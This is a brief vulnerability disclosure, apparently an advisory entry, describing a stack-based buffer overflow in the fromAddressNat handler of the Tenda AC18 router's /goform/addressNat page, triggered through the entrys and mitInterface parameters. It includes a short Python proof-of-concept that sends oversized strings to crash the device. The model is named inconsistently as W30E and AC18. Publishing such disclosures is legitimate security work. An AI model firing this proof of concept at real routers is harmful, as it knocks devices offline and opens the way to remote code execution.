# Tenda Router AC18 Vulnerability
This vulnerability lies in the `/goform/addressNat` page which influences the lastest version of Tenda Router W30E. (The latest version is [AC18_V15.03.05.19(6318)](https://www.tenda.com.cn/download/detail-2683.html))

## Vulnerability Description
There is a stack-based buffer overflow vulnerability in function `fromAddressNat`.

In function `fromAddressNat` it reads 2 user provided parameters `entrys` and `mitInterface` into `v9` and `v8`, and these two variables are passed into function `sprintf` without any length check, which may overflow the stack-based buffer `s`.
![](https://github.com/Funcy33/Vluninfo_Repo/blob/main/CNVDs/192/vlun.png)

So by requesting the page `/goform/addressNat`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.
## POC
```
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/addressNat?"
url += "entrys=" + "s" * 0x200
url += "&mitInterface=" + "a" * 0x200

response = requests.get(url)
```
## Timeline
## Acknowledgment
Credit to [@Funcy_kilar](https://github.com/Funcy33) from Guangzhou University.
